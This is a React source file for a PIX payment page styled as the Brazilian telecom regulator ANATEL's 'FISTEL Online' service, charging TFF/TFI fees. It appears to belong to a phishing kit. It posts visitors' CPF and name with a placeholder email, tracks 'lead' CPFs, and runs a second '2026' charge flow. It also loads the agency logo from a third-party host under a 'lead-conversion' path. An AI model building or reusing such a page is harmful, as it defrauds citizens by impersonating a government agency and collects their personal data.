import React, { useState, useEffect, useRef } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import axios from 'axios';
import { QRCode } from 'react-qrcode-logo';
import AnatelHeader from '@/components/AnatelHeader';
import AnatelFooter from '@/components/AnatelFooter';
import { toast } from 'sonner';

const BACKEND_URL = process.env.REACT_APP_BACKEND_URL;
const API = `${BACKEND_URL}/api`;
const fmt = (v) => new Intl.NumberFormat('pt-BR', { style: 'currency', currency: 'BRL' }).format(v || 0);

export default function AnatelPagamentoPage() {
  const navigate = useNavigate();
  const location = useLocation();
  const [dadosPessoa, setDadosPessoa] = useState(null);
  const [taxas, setTaxas] = useState(null);
  const [pagamento, setPagamento] = useState(null);
  const [loading, setLoading] = useState(false);
  const [copiado, setCopiado] = useState(false);
  const pixGeradoRef = useRef(false);
  const stateRef = useRef(location.state);

  useEffect(() => {
    if (pixGeradoRef.current) return;
    pixGeradoRef.current = true;
    const state = stateRef.current;
    if (!state?.dadosPessoa || !state?.taxas) { toast.error('Dados não encontrados'); navigate('/anatel'); return; }
    setDadosPessoa(state.dadosPessoa);
    setTaxas(state.taxas);
    gerarPix(state.dadosPessoa, state.taxas, state.cpfAnterior);
  }, []);

  const gerarPix = async (pessoa, taxasData, cpfAnterior = null) => {
    setLoading(true);
    try {
      const endpoint = cpfAnterior ? `${API}/pagamento/pix-2026` : `${API}/pagamento/pix`;
      const payload = {
        cpf: pessoa.cpf,
        nome: pessoa.nome,
        email: 'contato@contribuinte.com',
        valor: taxasData.total,
        ...(cpfAnterior && { cpf_anterior: cpfAnterior }),
        ...(pessoa.cpf_lead && !cpfAnterior && { cpf_lead: pessoa.cpf_lead })
      };
      const { data } = await axios.post(endpoint, payload);
      setPagamento(data);
      toast.success('QR Code gerado!');
      iniciarMonitoramento(data.id, data.cpf_utilizado);
    } catch (err) {
      console.error(err);
      toast.error('Erro ao gerar PIX. Tente novamente.');
    } finally {
      setLoading(false);
    }
  };

  const iniciarMonitoramento = (id, cpfUtilizado) => {
    const is2026 = stateRef.current?.exercicio2026;
    const interval = setInterval(async () => {
      try {
        const { data } = await axios.get(`${API}/pagamento/status/${id}`);
        if (['paid', 'approved', 'CONFIRMED'].includes(data.status)) {
          clearInterval(interval);
          toast.success('Pagamento confirmado!');
          setTimeout(() => {
            const pessoa = stateRef.current?.dadosPessoa;
            const totalTaxas = stateRef.current?.taxas?.total;
            if (is2026) navigate('/anatel/em-dia', { state: { cpf: pessoa?.cpf, dadosPessoa: pessoa } });
            else navigate('/anatel/confirmacao', { state: { valor: totalTaxas, cpf: pessoa?.cpf, dadosPessoa: pessoa, cpfUtilizado } });
          }, 1500);
        }
      } catch { }
    }, 10000);
    setTimeout(() => clearInterval(interval), 30 * 60 * 1000);
  };

  const copiar = () => {
    if (pagamento?.qr_code) {
      const textArea = document.createElement('textarea');
      textArea.value = pagamento.qr_code;
      textArea.style.position = 'fixed';
      textArea.style.left = '-9999px';
      document.body.appendChild(textArea);
      textArea.focus();
      textArea.select();
      try {
        document.execCommand('copy');
        setCopiado(true);
        toast.success('Código copiado!');
        setTimeout(() => setCopiado(false), 3000);
      } catch {
        navigator.clipboard?.writeText(pagamento.qr_code)
          .then(() => { setCopiado(true); toast.success('Código copiado!'); setTimeout(() => setCopiado(false), 3000); })
          .catch(() => toast.error('Não foi possível copiar.'));
      }
      document.body.removeChild(textArea);
    }
  };

  const is2026 = stateRef.current?.exercicio2026;
  const tipoTaxa = taxas?.taxas?.[0]?.tipo || 'TFF';
  const isTFI = tipoTaxa.includes('TFI');

  return (
    <div className="min-h-screen flex flex-col bg-white" style={{ fontFamily: "'Open Sans','Segoe UI',system-ui,sans-serif" }}>
      <AnatelHeader breadcrumb={`Pagamento PIX — ${isTFI ? 'TFI' : 'TFF'} 2025`} />
      <div style={{ background: '#071D41' }} className="py-6 px-4">
        <div className="max-w-[1280px] mx-auto flex flex-col md:flex-row items-center justify-center gap-6">
          <img src="https://customer-assets.emergentagent.com/job_lead-conversion-9/artifacts/ktf9iqob_pngwing.com.png" alt="ANATEL" className="w-24 md:w-32 h-auto" />
          <div className="text-center md:text-left">
            <p style={{ color: '#FFCD07' }} className="text-[11px] font-bold uppercase tracking-widest mb-1">FISTEL Online</p>
            <h1 className="text-white font-bold text-xl md:text-2xl">Pagamento PIX — {isTFI ? 'TFI' : 'TFF'} 2025</h1>
          </div>
        </div>
      </div>
      <main className="flex-1 py-8">
        <div className="max-w-[1280px] mx-auto px-4">
          <div className="grid lg:grid-cols-3 gap-8">
            <div className="lg:col-span-2">
              <div style={{ background: '#1351B4' }} className="px-5 py-3">
                <h2 className="text-white font-bold text-[13px] uppercase tracking-wider">QR Code para Pagamento PIX</h2>
              </div>
              <div style={{ border: '1px solid #1351B4', borderTop: 'none' }} className="bg-white">
                <div style={{ background: '#f0f5ff', borderBottom: '1px solid #c7d9f5' }} className="p-5 text-center">
                  <p className="text-[11px] text-gray-500 uppercase tracking-widest mb-1">Valor a Pagar</p>
                  <p className="font-black text-[40px] text-[#071D41]" data-testid="valor-pagamento">{fmt(taxas?.total)}</p>
                  <p className="text-[12px] text-[#1351B4] mt-1 font-medium">
                    {isTFI ? 'Taxa de Fiscalização de Instalação' : 'Taxa de Fiscalização de Funcionamento'} — Exercício 2025
                  </p>
                </div>
                <div className="p-6">
                  {loading ? (
                    <div className="flex flex-col items-center py-14">
                      <div className="w-10 h-10 border-2 border-[#1351B4]/20 border-t-[#1351B4] rounded-full animate-spin mb-4" />
                      <p className="text-gray-500 text-[14px]">Gerando QR Code...</p>
                    </div>
                  ) : pagamento?.qr_code ? (
                    <>
                      <div className="flex flex-col md:flex-row gap-6 items-start">
                        <div style={{ border: '2px solid #e0e0e0', padding: 16 }} className="bg-white flex-shrink-0 mx-auto md:mx-0">
                          <QRCode value={pagamento.qr_code} size={190} quietZone={10} bgColor="#FFFFFF" fgColor="#071D41" />
                        </div>
                        <div className="flex-1">
                          <p className="font-bold text-[13px] text-[#071D41] uppercase tracking-wide mb-3">Como pagar:</p>
                          <ol className="space-y-2">
                            {['Abra o aplicativo do seu banco','Acesse a função PIX → Ler QR Code','Aponte a câmera para o código ao lado','Confirme os dados e finalize o pagamento'].map((s, i) => (
                              <li key={i} className="flex items-start gap-2 text-[13px] text-gray-600">
                                <span style={{ background: '#1351B4', minWidth: 20, height: 20 }} className="flex items-center justify-center text-white font-bold text-[10px] flex-shrink-0 mt-0.5">{i + 1}</span>
                                {s}
                              </li>
                            ))}
                          </ol>
                          <div style={{ background: '#fff8e1', border: '1px solid #ffc107' }} className="flex items-center gap-2 p-3 mt-4">
                            <p className="text-[12px] font-bold" style={{ color: '#856404' }}>Aguardando confirmação de pagamento...</p>
                          </div>
                        </div>
                      </div>
                      <div className="mt-5 p-4 bg-gray-50 rounded-lg border border-gray-200">
                        <p className="text-[11px] text-gray-500 uppercase tracking-wider font-bold mb-2">Código PIX Copia e Cola:</p>
                        <div className="bg-white border border-gray-300 rounded p-3 font-mono text-[11px] text-gray-700 break-all max-h-24 overflow-y-auto">{pagamento.qr_code}</div>
                      </div>
                      <button onClick={copiar} style={{ border: `2px solid ${copiado ? '#168821' : '#1351B4'}`, color: copiado ? '#168821' : '#1351B4' }}
                        className="w-full flex items-center justify-center gap-2 font-bold text-[13px] py-3 mt-4 hover:opacity-80 cursor-pointer bg-white">
                        {copiado ? 'Código copiado!' : 'Copiar código PIX'}
                      </button>
                    </>
                  ) : (
                    <div className="text-center py-10">
                      <p className="text-[14px] font-medium text-gray-600">Erro ao gerar QR Code</p>
                    </div>
                  )}
                </div>
              </div>
            </div>
            <aside className="space-y-5">
              {dadosPessoa && (
                <div>
                  <div style={{ background: '#1351B4' }} className="px-4 py-3">
                    <h3 className="text-white font-bold text-[13px] uppercase tracking-wider">Resumo</h3>
                  </div>
                  <div style={{ border: '1px solid #e0e0e0', borderTop: 'none' }} className="bg-white">
                    {[
                      { label: 'Contribuinte', val: dadosPessoa.nome?.substring(0, 30) },
                      { label: 'Taxa', val: `${isTFI ? 'TFI' : 'TFF'} 2025` },
                      { label: 'Valor', val: fmt(taxas?.total), bold: true },
                    ].map(r => (
                      <div key={r.label} style={{ borderBottom: '1px solid #f0f0f0' }} className="px-4 py-3">
                        <p className="text-[10px] text-gray-500 uppercase tracking-wide mb-0.5">{r.label}</p>
                        <p className={`text-[13px] ${r.bold ? 'font-black text-[#1351B4] text-[16px]' : 'font-bold text-[#071D41] uppercase'}`}>{r.val}</p>
                      </div>
                    ))}
                  </div>
                </div>
              )}
            </aside>
          </div>
        </div>
      </main>
      <AnatelFooter />
    </div>
  );
}
